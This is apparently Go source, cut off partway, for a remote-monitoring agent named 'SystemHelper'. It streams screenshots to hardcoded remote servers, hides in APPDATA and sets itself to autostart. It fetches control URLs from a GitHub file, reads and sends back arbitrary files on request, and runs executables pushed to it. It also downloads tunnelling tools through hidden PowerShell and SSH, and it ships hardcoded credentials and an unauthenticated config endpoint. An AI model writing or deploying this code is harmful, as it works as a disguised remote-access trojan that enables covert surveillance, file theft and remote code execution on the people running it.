package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/jpeg"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
	"github.com/gorilla/websocket"
	"github.com/pion/webrtc/v4"
)

const Version = "7.0.0"

var agentId string
var isServerMode = false
var isInternalMode = false
var orgName = ""
var fps = 1
var jpegQuality = 50
var isRemoteConnection = false
var frameSkipCounter = 0
var logFile *os.File
var hostname string
var authUser = "puneet"
var authPass = "puneet12"
var authToken = ""

// Connection ID for race condition prevention — each reconnect gets a new ID
var connectionId string

// Rate limiting for control commands
var controlCmdCount int
var controlCmdWindowStart time.Time
const maxControlCmdsPerSec = 30

// Fallback tracking
var consecutiveFailures int
var tunnelStarted bool

// Embedded default URLs — zero-config, works out of the box
const (
	DefaultServerURL   = "wss://pu-k752.onrender.com"
	DirectServerIP     = "ws://43.247.40.101:3000"
	GitHubRegistryURL  = "https://raw.githubusercontent.com/puniteswra-spec/PU/main/urls.ini"
	ConfigPort         = 8181
)

var serverUrls = []string{
	DefaultServerURL,
	"ws://127.0.0.1:3000",
	DirectServerIP,
}

var serverNames = map[string]string{
	"render": DefaultServerURL,
	"direct": DirectServerIP,
}

// Activity tracking
var programStartTime = time.Now()
var lastIdleState = "active"
var idlePeriodStart time.Time
var activePeriodStart = time.Now()
var totalIdleSeconds int64
var totalActiveSeconds int64
var currentIdleSeconds int

// Data directory for config/logs (hidden from user)
func dataDir() string {
	exe, _ := os.Executable()
	// On Windows, use %APPDATA%\SystemHelper
	if runtime.GOOS == "windows" {
		appData := os.Getenv("APPDATA")
		if appData != "" {
			d := filepath.Join(appData, "SystemHelper")
			os.MkdirAll(d, 0755)
			return d
		}
	}
	// Fallback: next to .exe
	return filepath.Dir(exe)
}

func loadAuth() {
	cfgFile := filepath.Join(dataDir(), "auth.ini")

	// Try to read from file
	data, err := os.ReadFile(cfgFile)
	if err == nil {
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "username=") {
				authUser = strings.TrimPrefix(line, "username=")
			}
			if strings.HasPrefix(line, "password=") {
				authPass = strings.TrimPrefix(line, "password=")
			}
		}
	} else {
		// Create default config file
		defaultCfg := "username=" + authUser + "\npassword=" + authPass + "\n"
		os.WriteFile(cfgFile, []byte(defaultCfg), 0644)
	}
	authToken = sha256Hex(authUser + ":" + authPass)
}

func sha256Hex(s string) string {
	h := sha256.Sum256([]byte(s))
	return fmt.Sprintf("%x", h)
}

func checkAuth(w http.ResponseWriter, r *http.Request) bool {
	u, p, ok := r.BasicAuth()
	if ok && u == authUser && p == authPass { return true }
	w.Header().Set("WWW-Authenticate", `Basic realm="Remote Monitor"`)
	http.Error(w, "Unauthorized", 401)
	return false
}

func loadCustomUrls() {
	exe, _ := os.Executable()
	exeDir := filepath.Dir(exe)
	exeFile := filepath.Join(exeDir, "urls.ini")
	dataFile := filepath.Join(dataDir(), "urls.ini")
	
	paths := []string{exeFile, dataFile}
	for _, urlFile := range paths {
		data, err := os.ReadFile(urlFile)
		if err != nil { continue }
		
		lines := strings.Split(string(data), "\n")
		for i := len(lines) - 1; i >= 0; i-- {
			line := strings.TrimSpace(lines[i])
			if line != "" && !strings.HasPrefix(line, "#") {
				serverUrls = append([]string{line}, serverUrls...)
			}
		}
		log("Loaded URLs from: " + urlFile)
		break
	}
	
	resp, err := http.Get(GitHubRegistryURL)
	if err == nil && resp != nil {
		defer resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			buf := new(bytes.Buffer)
			_, readErr := buf.ReadFrom(resp.Body)
			if readErr == nil {
				lines := strings.Split(buf.String(), "\n")
				added := false
				for i := len(lines) - 1; i >= 0; i-- {
					line := strings.TrimSpace(lines[i])
					if line != "" && !strings.HasPrefix(line, "#") {
						serverUrls = append([]string{line}, serverUrls...)
						added = true
					}
				}
				if added {
					log("Loaded URLs from Central GitHub Registry")
				}
			}
		}
	}
	
	// Deduplicate URLs while preserving order
	seen := make(map[string]bool)
	deduped := []string{}
	for _, u := range serverUrls {
		if !seen[u] {
			seen[u] = true
			deduped = append(deduped, u)
		}
	}
	serverUrls = deduped
}

// Built-in config web server — access via http://localhost:8181
func startConfigServer() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		w.Write([]byte(configPageHTML))
	})
	http.HandleFunc("/api/status", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"version":   Version,
			"agentId":   agentId,
			"hostname":  hostname,
			"urls":      serverUrls,
			"uptime":    time.Since(programStartTime).String(),
			"connected": wsRef != nil,
		})
	})
	http.HandleFunc("/api/urls", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			var body struct {
				URL string `json:"url"`
			}
			json.NewDecoder(r.Body).Decode(&body)
			if body.URL != "" {
				serverUrls = append([]string{body.URL}, serverUrls...)
				dataFile := filepath.Join(dataDir(), "urls.ini")
				os.WriteFile(dataFile, []byte(body.URL+"\n"), 0644)
				log("URL updated via config panel: " + body.URL)
				if wsRef != nil { wsRef.Close() }
			}
			w.Write([]byte(`{"ok":true}`))
		} else {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]interface{}{"urls": serverUrls})
		}
	})
	http.HandleFunc("/api/restart", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte(`{"ok":true}`))
		go func() { time.Sleep(500 * time.Millisecond); os.Exit(0) }()
	})
	
	addr := fmt.Sprintf("127.0.0.1:%d", ConfigPort)
	go func() {
		if err := http.ListenAndServe(addr, nil); err != nil {
			log("Config server error: " + err.Error())
		}
	}()
	log("Config panel: http://localhost:" + strconv.Itoa(ConfigPort))
}

const configPageHTML = `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>SystemHelper Config</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui;background:#0a0a1a;color:#ccc;min-height:100vh;display:flex;align-items:center;justify-content:center}
.box{background:#111;border:1px solid #222;border-radius:12px;padding:24px;max-width:500px;width:90%}
h2{color:#7c7cf0;margin-bottom:16px;font-size:18px}
.row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #1a1a1a;font-size:13px}
.row span:first-child{color:#666}
input{width:100%;padding:8px;background:#0a0a0a;border:1px solid #333;color:#fff;border-radius:6px;margin:8px 0;font-size:13px}
button{background:#7c7cf0;color:#fff;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:13px;margin-top:8px}
button:hover{background:#6a6ae0}
#status{margin-top:12px;font-size:12px;color:#4caf50;display:none}
</style></head><body>
<div class="box">
<h2>⚙ SystemHelper Config</h2>
<div id="info"></div>
<h3 style="color:#888;font-size:13px;margin:16px 0 8px">Add Server URL</h3>
<input id="new-url" placeholder="ws://your-server:3000">
<button onclick="addUrl()">Add & Reconnect</button>
<button onclick="restart()" style="background:#333;margin-left:8px">Restart Agent</button>
<div id="status"></div>
</div>
<script>
async function load(){
  const r=await fetch('/api/status');const d=await r.json();
  document.getElementById('info').innerHTML=
    '<div class="row"><span>Version</span><span>'+d.version+'</span></div>'+
    '<div class="row"><span>Agent</span><span>'+d.agentId+'</span></div>'+
    '<div class="row"><span>Host</span><span>'+d.hostname+'</span></div>'+
    '<div class="row"><span>Uptime</span><span>'+d.uptime+'</span></div>'+
    '<div class="row"><span>Connected</span><span style="color:'+(d.connected?'#4caf50':'#f44336')+'">'+(d.connected?'Yes':'No')+'</span></div>'+
    '<div class="row"><span>Server URLs</span><span>'+d.urls.join(', ')+'</span></div>';
}
async function addUrl(){
  const url=document.getElementById('new-url').value;
  if(!url)return;
  await fetch('/api/urls',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})});
  document.getElementById('status').textContent='✅ URL added — reconnecting...';
  document.getElementById('status').style.display='block';
  setTimeout(()=>location.reload(),2000);
}
async function restart(){
  await fetch('/api/restart');
  document.getElementById('status').textContent='🔄 Restarting...';
  document.getElementById('status').style.display='block';
}
load();setInterval(load,5000);
</script></body></html>`

// Agent info for server mode
type AgentInfo struct {
	Ws       *websocket.Conn
	Name     string
	LastFrame string
	Viewers  map[*websocket.Conn]bool
}

func init() {
	hostname, _ = os.Hostname()
	loadAuth()
	loadCustomUrls()
	f, _ := os.OpenFile(filepath.Join(dataDir(), "agent.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	logFile = f
	os.MkdirAll(receivedDir(), 0755)
	log("Started v" + Version)
}

func log(msg string) {
	fmt.Println(time.Now().Format("15:04:05") + " " + msg)
	if logFile != nil {
		logFile.WriteString(time.Now().Format("15:04:05") + " " + msg + "\n")
		logFile.Sync()
	}
}

type Message struct {
	Type    string                 `json:"type"`
	AgentId string                 `json:"agentId,omitempty"`
	Name    string                 `json:"name,omitempty"`
	Org     string                 `json:"org,omitempty"`
	Frame   string                 `json:"frame,omitempty"`
	Display int                    `json:"display,omitempty"`
	Fps     int                    `json:"fps,omitempty"`
	Command string                 `json:"command,omitempty"`
	Params  map[string]string      `json:"params,omitempty"`
	Data    map[string]interface{} `json:"data,omitempty"`
}

func main() {
	runtime.LockOSThread()
	
	fmt.Println("SystemHelper v" + Version + " starting...")
	fmt.Println("Logs: " + filepath.Join(dataDir(), "agent.log"))
	
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT, syscall.SIGKILL, syscall.SIGQUIT)
	go func() {
		sig := <-sigCh
		fmt.Fprintf(os.Stderr, "RECEIVED SIGNAL: %v\n", sig)
		log("RECEIVED SIGNAL: " + sig.String())
		os.Exit(0)
	}()
	
	log("Started v" + Version)
	
	// Check for --server flag (manual server mode)
	useMode := ""
	for i := 0; i < len(os.Args); i++ {
		arg := os.Args[i]
		if arg == "--server" || arg == "-s" {
			isServerMode = true
		}
		if arg == "--internal" || arg == "-i" {
			isInternalMode = true
		}
		if arg == "--org" || arg == "-o" {
			if i+1 < len(os.Args) {
				orgName = os.Args[i+1]
			}
		}
		if arg == "--use" || arg == "-u" {
			if i+1 < len(os.Args) {
				useMode = os.Args[i+1]
			}
		}
		if arg == "--help" || arg == "-h" || arg == "/?" {
			fmt.Println("SystemHelper v" + Version)
			fmt.Println("")
			fmt.Println("Usage:")
			fmt.Println("  SystemHelper.exe                  Auto mode (try all)")
			fmt.Println("  SystemHelper.exe --server         Force this PC to be the server")
			fmt.Println("  SystemHelper.exe --org <name>       Set organization name (for multi-org)")
			fmt.Println("  SystemHelper.exe --internal          Internal mode (no cloud, one file)")
			fmt.Println("  SystemHelper.exe --internal --server Internal mode as server")
			fmt.Println("  SystemHelper.exe --setup-internal Create urls.ini for internal mode")
			fmt.Println("  SystemHelper.exe --setup-org <name> Create org folder with config")
			fmt.Println("  SystemHelper.exe --use <name>     Use only specific server:")
			fmt.Println("    Names: render, ngrok, cloudflare, direct, local")
			fmt.Println("")
			fmt.Println("Examples:")
			fmt.Println("  SystemHelper.exe --internal           Run in internal mode (no cloud)")
			fmt.Println("  SystemHelper.exe --internal --server  Internal mode + become server")
			fmt.Println("  SystemHelper.exe --setup-internal     Create urls.ini file")
			fmt.Println("  SystemHelper.exe --setup-org Office1  Create 'Office1' folder")
			fmt.Println("  SystemHelper.exe --use render         Only use Render.com")
			fmt.Println("")
			fmt.Println("Config files (in %APPDATA%\\SystemHelper\\):")
			fmt.Println("  auth.ini   - Change password")
			fmt.Println("  urls.ini   - Custom server URLs")
			fmt.Println("  agent.ini  - Server preference")
			os.Exit(0)
		}
		if arg == "--setup-internal" {
			setupInternalMode()
		}
		if strings.HasPrefix(arg, "--setup-org") {
			orgName := ""
			if strings.Contains(arg, "=") {
				orgName = strings.SplitN(arg, "=", 2)[1]
			} else if i+1 < len(os.Args) {
				orgName = os.Args[i+1]
			}
			if orgName != "" {
				setupOrgMode(orgName)
			}
		}
	}

	// Apply --use filter
	if useMode != "" {
		if url, ok := serverNames[useMode]; ok {
			serverUrls = []string{url}
			log("Manual mode: using " + useMode + " (" + url + ")")
		} else {
			log("Unknown server name: " + useMode + ". Using auto mode.")
		}
	}

	preventDuplicate()
	loadAgentId()
	setupAutostart()
	startActivityLogger()
	startConfigServer()
	
	// Check if this PC was remotely designated as fallback server
	preferredServer := loadServerPreference()
	if isServerMode || preferredServer {
		log("Designated as SERVER")
		go runServer()
	}

	// Auto-discover server: check localhost first, then scan network
	conn, err := net.DialTimeout("tcp", "127.0.0.1:3000", 500*time.Millisecond)
	if err == nil {
		conn.Close()
		log("Found local server on localhost:3000 (will use as secondary for fast local viewing)")
	} else {
		log("No local server → scanning network for server...")
		serverIP := discoverServer()
		if serverIP != "" {
			log("Found server at: " + serverIP)
			serverUrls = append(serverUrls, "ws://"+serverIP+":3000")
		} else if !isServerMode && !preferredServer {
			ln, listenErr := net.Listen("tcp", "0.0.0.0:3000")
			if listenErr == nil {
				ln.Close()
				log("No server found → starting local server mode")
				go runServer()
			}
		} else if isServerMode || preferredServer {
			go runServer()
		}
	}
	log("Agent ID: " + agentId)
	log("SystemHelper v" + Version + " — Zero-config, self-healing, auto-updating")
	
	retryDelay := 5 * time.Second
	maxRetryDelay := 60 * time.Second
	refreshTicker := time.NewTicker(10 * time.Minute)
	
	for {
		func() {
			defer func() {
				if r := recover(); r != nil {
					log("CRASH: " + fmt.Sprintf("%v", r))
				}
			}()
			connect()
		}()
		
		// Smart exponential backoff
		log("Reconnecting in " + retryDelay.String() + "...")
		select {
		case <-time.After(retryDelay):
			retryDelay = retryDelay * 2
			if retryDelay > maxRetryDelay { retryDelay = maxRetryDelay }
		case <-refreshTicker.C:
			log("Periodic URL refresh from GitHub Registry")
			go func() {
				resp, err := http.Get(GitHubRegistryURL)
				if err == nil && resp != nil && resp.StatusCode == 200 {
					buf := new(bytes.Buffer)
					buf.ReadFrom(resp.Body)
					resp.Body.Close()
					lines := strings.Split(buf.String(), "\n")
					for _, line := range lines {
						line = strings.TrimSpace(line)
						if line != "" && !strings.HasPrefix(line, "#") {
							found := false
							for _, u := range serverUrls {
								if u == line { found = true; break }
							}
							if !found {
								serverUrls = append([]string{line}, serverUrls...)
								log("New URL from registry: " + line)
							}
						}
					}
				}
			}()
			retryDelay = 2 * time.Second
		}
	}
}

func loadServerPreference() bool {
	cfgFile := filepath.Join(dataDir(), "agent.ini")
	data, err := os.ReadFile(cfgFile)
	if err != nil { return false }
	for _, line := range strings.Split(string(data), "\n") {
		if strings.TrimSpace(line) == "prefer_server=true" {
			return true
		}
	}
	return false
}

func saveServerPreference(prefer bool) {
	cfgFile := filepath.Join(dataDir(), "agent.ini")
	val := "false"
	if prefer { val = "true" }
	os.WriteFile(cfgFile, []byte("prefer_server="+val+"\n"), 0644)
}

func handleRemoteUpdate(filename, data string) {
	exe, _ := os.Executable()
	dir := filepath.Dir(exe)
	tmpPath := filepath.Join(dir, filename + ".tmp")
	
	// Decode and save
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil { log("Update decode failed: " + err.Error()); return }
	
	err = os.WriteFile(tmpPath, decoded, 0644)
	if err != nil { log("Update write failed: " + err.Error()); return }
	
	log("Update received: " + filename + " (" + fmt.Sprintf("%d bytes", len(decoded)) + ")")
	
	// Replace original and restart
	exePath := filepath.Join(dir, filename)
	os.Rename(tmpPath, exePath)
	
	log("Update applied. Restarting...")
	
	// Start new version and exit this one
	cmd := exec.Command(exePath)
	hideCmd(cmd)
	cmd.Start()
	os.Exit(0)
}

func loadAgentId() {
	cfgFile := filepath.Join(dataDir(), "agent.id")
	data, _ := os.ReadFile(cfgFile)
	if len(data) > 0 { agentId = string(data); return }
	agentId = hostname + "-" + fmt.Sprintf("%x", time.Now().UnixNano())[:8]
	os.WriteFile(cfgFile, []byte(agentId), 0644)
}

func setupInternalMode() {
	exe, _ := os.Executable()
	dir := filepath.Dir(exe)
	urlsPath := filepath.Join(dir, "urls.ini")
	os.WriteFile(urlsPath, []byte("auto-local\n"), 0644)
	
	fmt.Println("✅ Internal mode configured!")
	fmt.Println("   Created: " + urlsPath)
	fmt.Println("")
	fmt.Println("   To start as SERVER on this PC:")
	fmt.Println("     SystemHelper.exe --server")
	fmt.Println("")
	fmt.Println("   Other PCs: copy urls.ini next to SystemHelper.exe")
	fmt.Println("   They will auto-discover the server on the network.")
	fmt.Println("")
	os.Exit(0)
}

func setupOrgMode(name string) {
	exe, _ := os.Executable()
	orgDir := filepath.Join(filepath.Dir(exe), name)
	os.MkdirAll(orgDir, 0755)
	
	// Copy .exe to org folder
	src, _ := os.ReadFile(exe)
	os.WriteFile(filepath.Join(orgDir, "SystemHelper.exe"), src, 0755)
	
	// Create urls.ini
	os.WriteFile(filepath.Join(orgDir, "urls.ini"), []byte("auto-local\n# org="+name+"\n"), 0644)
	
	// Create README
	readme := "INTERNAL SERVER - " + name + "\n" +
		"========================\n\n" +
		"Organization: " + name + "\n\n" +
		"SERVER SETUP:\n" +
		"  1. Copy this folder to the server PC\n" +
		"  2. Run: SystemHelper.exe --server\n" +
		"  3. Dashboard: http://[SERVER-IP]:3000\n\n" +
		"AGENT SETUP:\n" +
		"  1. Copy this folder to each agent PC\n" +
		"  2. Double-click SystemHelper.exe\n" +
		"  3. Agents auto-connect to the server\n\n" +
		"All PCs must be on the same network.\n"
	os.WriteFile(filepath.Join(orgDir, "README.txt"), []byte(readme), 0644)
	
	fmt.Println("✅ Organization '" + name + "' setup complete!")
	fmt.Println("   Folder: " + orgDir)
	fmt.Println("")
	fmt.Println("   Files created:")
	fmt.Println("     " + name + "\\SystemHelper.exe")
	fmt.Println("     " + name + "\\urls.ini")
	fmt.Println("     " + name + "\\README.txt")
	fmt.Println("")
	fmt.Println("   Copy this folder to all PCs in the organization.")
	os.Exit(0)
}

func cleanupLogs() {
	log("Cleaning logs...")
	dir := dataDir()
	
	// Delete activity logs older than 30 days
	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil { return nil }
		if !info.IsDir() && strings.HasPrefix(info.Name(), "activity-") {
			if time.Since(info.ModTime()).Hours() > 24*30 { // 30 days
				os.Remove(path)
				log("Removed old log: " + info.Name())
			}
		}
		return nil
	})
	
	// Clear agent.log
	os.Truncate(filepath.Join(dir, "agent.log"), 0)
	
	// Clear error.log
	os.Truncate(filepath.Join(dir, "error.log"), 0)
	
	// Send status to server
	if wsRef != nil {
		wsRef.WriteJSON(Message{Type: "agent-log", Frame: "Logs cleaned"})
	}
	log("Logs cleaned")
}

var wsRef *websocket.Conn // Reference to primary WebSocket for agent responses
var localCancel context.CancelFunc // Cancel previous secondary goroutine on reconnect

func logEventDate(msg string) {
	path := filepath.Join(dataDir(), "activity-"+time.Now().Format("2006-01-02")+".log")
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil { return }
	defer f.Close()
	f.WriteString(time.Now().Format("2006-01-02 15:04:05") + " " + msg + "\n")
}

func logEvent(path, msg string) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil { return }
	defer f.Close()
	f.WriteString(time.Now().Format("01-02 15:04") + " " + msg + "\n")
}


func cleanOldReceived() {
	dir := receivedDir()
	os.MkdirAll(dir, 0755)
	entries, _ := os.ReadDir(dir)
	for _, e := range entries {
		path := filepath.Join(dir, e.Name())
		os.RemoveAll(path)
	}
}

func sanitizeFilename(name string) string {
	name = filepath.Base(name)
	name = strings.Map(func(r rune) rune {
		if r >= 32 && r <= 126 && r != '/' && r != '\\' && r != ':' && r != '*' && r != '?' && r != '"' && r != '<' && r != '>' && r != '|' {
			return r
		}
		return '_'
	}, name)
	if name == "" || name == "." || name == ".." {
		return "unnamed_file"
	}
	if len(name) > 255 {
		name = name[:255]
	}
	return name
}

func handleFileTransfer(filename, data string) {
	dir := receivedDir()
	os.MkdirAll(dir, 0755)
	safeName := sanitizeFilename(filename)
	dest := filepath.Join(dir, safeName)
	if !strings.HasPrefix(dest, dir) {
		log("File transfer path traversal blocked: " + filename)
		return
	}
	
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil { log("File transfer decode failed: " + err.Error()); return }
	
	err = os.WriteFile(dest, decoded, 0644)
	if err != nil { log("File transfer write failed: " + err.Error()); return }
	
	log("File received: " + safeName + " (" + fmt.Sprintf("%d bytes", len(decoded)) + ") saved to " + dest)
}

func sanitizePath(path string) string {
	clean := filepath.Clean(path)
	if !filepath.IsAbs(clean) {
		if runtime.GOOS == "windows" {
			clean = filepath.Join("C:\\", clean)
		} else {
			clean = filepath.Join("/", clean)
		}
	}
	return clean
}

func handleFileRequest(path string, conn *websocket.Conn) {
	if path == "" {
		log("File request: empty path rejected")
		conn.WriteJSON(Message{Type: "file-response", Command: path, Frame: "error: empty path"})
		return
	}
	safePath := sanitizePath(path)
	data, err := os.ReadFile(safePath)
	if err != nil {
		log("File request failed: " + err.Error())
		conn.WriteJSON(Message{Type: "file-response", Command: path, Frame: "error: " + err.Error()})
		return
	}
	encoded := base64.StdEncoding.EncodeToString(data)
	conn.WriteJSON(Message{Type: "file-response", Command: path, Frame: encoded})
	log("File sent: " + safePath + " (" + fmt.Sprintf("%d bytes", len(data)) + ")")
}

func sshAvailable() bool {
	_, err := exec.LookPath("ssh")
	return err == nil
}

func startTunnel(ws *websocket.Conn) {
	tunnelMode := "auto"
	if data, err := os.ReadFile(filepath.Join(dataDir(), "tunnel.ini")); err == nil {
		tunnelMode = strings.TrimSpace(string(data))
	}
	log("Tunnel mode: " + tunnelMode + ", SSH available: " + fmt.Sprintf("%v", sshAvailable()))
	
	go func() {
		var url string
		var lastErr string
		
		// Try bore.pub FIRST (no SSH needed, reliable on Windows)
		if url == "" && (tunnelMode == "auto" || tunnelMode == "bore") {
			log("Trying bore.pub...")
			borePath := filepath.Join(dataDir(), "bore.exe")
			if _, err := os.Stat(borePath); os.IsNotExist(err) {
				log("Downloading bore...")
				dl := exec.Command("powershell", "-Command",
					"Invoke-WebRequest -Uri 'https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-pc-windows-msvc.zip' -OutFile '"+
					filepath.Join(dataDir(), "bore.zip")+"' ; Expand-Archive '"+filepath.Join(dataDir(), "bore.zip")+"' -DestinationPath '"+
					dataDir()+"' -Force ; Remove-Item '"+filepath.Join(dataDir(), "bore.zip")+"'")
				hideCmd(dl)
				if err := dl.Run(); err != nil {
					lastErr = "bore download: " + err.Error()
					log("bore download failed: " + err.Error())
				}
			}
			if _, err := os.Stat(borePath); err == nil {
				cmd := exec.Command(borePath, "local", "3000", "--to", "bore.pub")
				hideCmd(cmd)
				stdout, _ := cmd.StdoutPipe()
				if err := cmd.Start(); err != nil {
					lastErr = "bore start: " + err.Error()
					log("bore start failed: " + err.Error())
				} else {
					buf := make([]byte, 256)
					n, _ := stdout.Read(buf)
					outLine := strings.TrimSpace(string(buf[:n]))
					if strings.Contains(outLine, ":") {
						port := strings.TrimSpace(strings.Split(outLine, " ")[0])
						url = "http://bore.pub:" + port
					}
					if url == "" && outLine != "" {
						url = outLine
					}
					if url == "" {
						lastErr = "bore: no URL in output: " + outLine
					}
				}
			} else {
				lastErr = "bore.exe not found after download"
			}
		}
		
		// Try localhost.run (SSH) as fallback
		if url == "" && (tunnelMode == "auto" || tunnelMode == "localhost.run") && sshAvailable() {
			log("Trying localhost.run...")
			cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
				"-o", "ConnectTimeout=10",
				"-R", "80:localhost:3000", "localhost.run")
			hideCmd(cmd)
			stdout, _ := cmd.StdoutPipe()
			if err := cmd.Start(); err != nil {
				lastErr = "localhost.run: " + err.Error()
				log("localhost.run start failed: " + err.Error())
			} else {
				done := make(chan string, 1)
				go func() {
					buf := make([]byte, 4096)
					n, _ := stdout.Read(buf)
					done <- string(buf[:n])
				}()
				select {
				case out := <-done:
					for _, line := range strings.Split(out, "\n") {
						if strings.Contains(line, "https") && strings.Contains(line, "localhost.run") {
							url = strings.TrimSpace(line)
							break
						}
					}
					if url == "" {
						lastErr = "localhost.run: no URL in output"
					}
				case <-time.After(15 * time.Second):
					lastErr = "localhost.run: timeout (SSH connected but no URL within 15s)"
					log("localhost.run: timeout waiting for URL")
				}
			}
		} else if url == "" && !sshAvailable() {
			lastErr = "SSH not available on this system"
		}
		
		// Try serveo.net (SSH, more reliable)
		if url == "" && (tunnelMode == "auto" || tunnelMode == "serveo") && sshAvailable() {
			log("Trying serveo.net...")
			cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
				"-o", "ConnectTimeout=10",
				"-R", "80:localhost:3000", "serveo.net")
			hideCmd(cmd)
			stdout, _ := cmd.StdoutPipe()
			if err := cmd.Start(); err != nil {
				lastErr = "serveo: " + err.Error()
				log("serveo.net start failed: " + err.Error())
			} else {
				done := make(chan string, 1)
				go func() {
					buf := make([]byte, 4096)
					n, _ := stdout.Read(buf)
					done <- string(buf[:n])
				}()
				select {
				case out := <-done:
					for _, line := range strings.Split(out, "\n") {
						if strings.Contains(line, "http") && strings.Contains(line, "serveo.net") {
							url = strings.TrimSpace(line)
							break
						}
					}
					if url == "" {
						lastErr = "serveo: no URL in output"
					}
				case <-time.After(15 * time.Second):
					lastErr = "serveo: timeout"
					log("serveo.net: timeout waiting for URL")
				}
			}
		}
		
		if url != "" {
			log("Tunnel URL: " + url)
			os.WriteFile(filepath.Join(dataDir(), "tunnel.url"), []byte(url), 0644)
			if ws != nil { ws.WriteJSON(Message{Type: "tunnel-status", Command: url, Frame: "ready"}) }
		} else {
			reason := lastErr
			if reason == "" { reason = "All tunnels failed (no reason)" }
			log("All tunnels failed: " + reason)
			if ws != nil { ws.WriteJSON(Message{Type: "tunnel-status", Command: reason, Frame: "failed"}) }
		}
	}()
}

// ============ SERVER MODE ============
func runServer() {
	log("SERVER MODE on port 3000")
	setupAutostart()
	startActivityLogger()
	agents := make(map[string]*AgentInfo)

	// Generate auth token from credentials
	authToken := sha256Hex(authUser + ":" + authPass)

	http.HandleFunc("/api/agents", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(w, r) { return }
		w.Header().Set("Access-Control-Allow-Origin", "*")
		list := []map[string]interface{}{}
		for id, a := range agents {
			list = append(list, map[string]interface{}{"id": id, "name": a.Name})
		}
		json.NewEncoder(w).Encode(list)
	})

	upgrader := websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		t := r.URL.Query().Get("token")
		if t == "" || t != authToken {
			if !checkAuth(w, r) { return }
		}
		conn, _ := upgrader.Upgrade(w, r, nil)
		if conn == nil { return }
		defer conn.Close()

		var role, agentIdPtr string
		for {
			_, msg, err := conn.ReadMessage()
			if err != nil { break }
			var d Message
			json.Unmarshal(msg, &d)

			switch d.Type {
			case "agent-hello":
				role = "agent"
				agentIdPtr = d.AgentId
				agents[d.AgentId] = &AgentInfo{Ws: conn, Name: d.Name, Viewers: make(map[*websocket.Conn]bool)}
				log("Agent: " + d.Name)
			case "agent-frame":
				if a, ok := agents[d.AgentId]; ok {
					if d.Display == 0 { a.LastFrame = d.Frame }
					for v := range a.Viewers { v.WriteJSON(Message{Type: "frame", AgentId: d.AgentId, Frame: d.Frame, Display: d.Display}) }
				}
			case "dashboard-hello":
				role = "dashboard"
				list := []map[string]interface{}{}
				for id, a := range agents { list = append(list, map[string]interface{}{"id": id, "name": a.Name}) }
				conn.WriteJSON(map[string]interface{}{"type": "agent-list", "agents": list})
			case "view-agent":
				if a, ok := agents[d.AgentId]; ok {
					a.Viewers[conn] = true
					if a.LastFrame != "" { conn.WriteJSON(Message{Type: "frame", AgentId: d.AgentId, Frame: a.LastFrame}) }
				}
			case "stop-viewing":
				for _, a := range agents { delete(a.Viewers, conn) }
			case "control":
				if a, ok := agents[d.AgentId]; ok { a.Ws.WriteJSON(Message{Type: "control", Command: d.Command, Params: d.Params}) }
			case "set-server-preference":
				if a, ok := agents[d.AgentId]; ok {
					a.Ws.WriteJSON(Message{Type: "set-server-preference", Command: d.Command})
					log("Set server pref for " + d.AgentId + " = " + d.Command)
				}
			case "become-server":
				if a, ok := agents[d.AgentId]; ok {
					a.Ws.WriteJSON(Message{Type: "become-server"})
					log("Forwarded become-server to " + d.AgentId)
				}
			case "file-transfer":
				if a, ok := agents[d.AgentId]; ok {
					a.Ws.WriteJSON(Message{Type: "file-transfer", Command: d.Command, Frame: d.Frame})
					log("Forwarded file-transfer to " + d.AgentId)
				}
			case "request-file":
				if a, ok := agents[d.AgentId]; ok {
					a.Ws.WriteJSON(Message{Type: "request-file", Command: d.Command})
					log("Forwarded request-file to " + d.AgentId)
				}
			}
		}
		if role == "agent" && agentIdPtr != "" { delete(agents, agentIdPtr); log("Agent gone: " + agentIdPtr) }
	})

	// Start embedded agent for this PC
	go func() {
		time.Sleep(1 * time.Second)
		c, _, err := websocket.DefaultDialer.Dial("ws://127.0.0.1:3000/ws?token="+authToken, nil)
		if err != nil { log("Embedded agent failed: " + err.Error()); return }
		c.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname + " (server)", Org: orgName, Data: map[string]interface{}{"agentIP": getLocalIP()}})
		go func() {
			for {
				_, m, e := c.ReadMessage()
		if e != nil { log("Disconnected: " + e.Error()); return }
				var msg Message
				json.Unmarshal(m, &msg)
				if msg.Type == "control" { executeControl(msg.Command, msg.Params) }
			}
		}()
		for {
			for _, m := range captureFrames() {
